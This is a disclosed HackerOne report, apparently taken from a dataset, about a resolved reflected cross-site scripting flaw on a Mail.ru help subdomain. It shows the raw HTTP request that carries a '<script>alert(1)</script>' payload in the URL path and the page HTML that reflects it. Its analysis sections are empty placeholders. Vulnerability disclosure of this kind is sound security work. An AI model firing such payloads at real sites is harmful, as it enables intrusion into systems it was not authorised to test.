---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '65921'
original_report_id: '65921'
title: 'help2.m.smailru.net: XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-06-04T14:56:45.302Z'
disclosed_at: '2015-09-13T12:59:44.397Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# help2.m.smailru.net: XSS

## Metadata

- HackerOne Report ID: 65921
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-09-13T12:59:44.397Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

GET /login/index.php/article/articleview/ALERT"><script>alert(1)</script> HTTP/1.1
Host: help2.m.smailru.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: _ga=GA1.2.1157874958.1431696489
Connection: keep-alive

<form class="form-signin" role="form" method="POST" action="/login/index.php/article/articleview/ALERT"><script>alert(1)</script>">
        <h2 class="form-signin-heading">Please sign in</h2>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
